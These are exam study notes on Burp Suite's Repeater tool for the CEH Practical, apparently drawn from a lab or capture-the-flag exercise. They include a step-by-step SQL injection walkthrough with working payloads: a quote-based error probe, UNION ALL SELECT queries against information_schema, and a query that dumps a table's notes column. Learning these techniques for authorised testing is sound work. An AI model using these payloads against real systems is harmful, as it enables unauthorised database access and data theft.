# 🔁 Burp Suite: Repeater (CEH Practical Notes)

---

## 📌 What is Repeater?

- Tool to **modify & resend HTTP requests**
    
- Works with:
    
    - Captured requests (from Proxy)
        
    - Manually created requests
        

### 🔥 Core Use:

- Manual testing
    
- Payload testing
    
- Exploitation (SQLi, XSS, etc.)
    

---

## 🧠 Core Concept

```
Captured Request → Send to Repeater → Modify → Send → Analyze Response
```

---

## 🧩 Repeater Interface (IMPORTANT)

```
+---------------------+
| Request List        |
+---------------------+
| Controls (Send)     |
+---------------------+
| Request | Response  |
+---------------------+
| Inspector | Target  |
+---------------------+
```

### Sections:

1. **Request List**
    
    - Stores multiple requests
        
2. **Request Controls**
    
    - Send / Cancel / History
        
3. **Request & Response View**
    
    - Edit request
        
    - View response
        
4. **Layout Options**
    
    - Horizontal / Vertical
        
5. **Inspector ⭐**
    
    - Easy modification (IMPORTANT)
        
6. **Target**
    
    - Destination IP/domain
        

---

## 🧠 Key Exam Point

- Easy modification tool → **Inspector**
    

---

## ⚙️ Basic Usage

### Send Request to Repeater:

```
Right Click → Send to Repeater
Shortcut: Ctrl + R
```

---

### Workflow:

```
1. Capture request (Proxy)
2. Send to Repeater
3. Modify request
4. Click Send
5. Analyze response
```

# 💉 SQL Injection Using Repeater (VERY IMPORTANT)

---

## 🎯 Target:

```
/about/ID
```

---

## 🔍 Step 1: Confirm Vulnerability

### Payload:

```
/about/2'
```

👉 Result:

```
500 Internal Server Error
```

---

## 🧠 Step 2: Extract Query Info

### Error Reveals:

```
SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 2'
```

### 🔥 Important Info:

- Table → `people`
    
- Columns → 5
    

---

## 🧪 Step 3: UNION Injection

```
/about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people"
```

---

## 🧠 Step 4: Extract All Columns

```
/about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people"
```

---

### Found Columns:

```
id, firstName, lastName, pfpLink, role, shortRole, bio, notes
```

---

## 🎯 Step 5: Extract Data

```
/about/0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id=1
```

---

## 🔥 SQLi Flow Diagram

```
Input → Break Query → Extract Info → UNION → Dump Data → Flag
```

---

## 🧠 Key SQLi Concepts

- `'` → Break query
    
- `UNION` → Combine queries
    
- `group_concat()` → Merge output
    
- `null` → Balance columns
